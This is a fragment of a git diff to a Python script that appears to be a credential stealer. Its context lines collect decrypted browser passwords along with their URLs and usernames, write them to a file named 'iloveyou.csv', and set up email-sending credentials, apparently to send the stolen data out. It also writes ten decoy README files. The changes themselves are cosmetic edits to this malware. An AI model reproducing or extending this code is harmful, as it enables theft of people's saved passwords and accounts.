@@ -7,7 +7,7 @@ from dotenv import load_dotenv
 import os, sys
 load_dotenv()
 
-if checkNetwork('https://google.com', timeout=5) != True:
+if checkNetwork() != True:
     messagebox.showinfo('HTTPSConnectionPool Error', message='Connect Network Error')
     sys.exit()
     
@@ -26,13 +26,13 @@ if __name__ == '__main__':
         from_password=FROM_PASSWORD,
         to_email=TO_EMAIL,
         )
-    text = f'{"-"*7} readme.txt {"-"*7}\n\n \t TROUXA \n\n{"-"*26}'
-    folder = 'README'
-    if not os.path.exists(folder):
-        os.mkdir(folder)
+    text = f'{"-"*7} readme.txt {"-"*7}\n\n \t LET ME \n\n{"-"*26}'
+    FOLDER = 'README'
+    if not os.path.exists(FOLDER):
+        os.mkdir(FOLDER)
 
     for txt in range(1, 11):
-        file = open(f'{folder}/README{txt}.txt', 'w')
+        file = open(f'{FOLDER}/README{txt}.txt', 'w')
         file.write(text)
         file.close()
 
@@ -52,7 +52,6 @@ if __name__ == '__main__':
         save = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n"
         with open('iloveyou.csv', 'a') as passwords:
             passwords.write(save)
-        passwords.close()
 
     # opera    
     try:
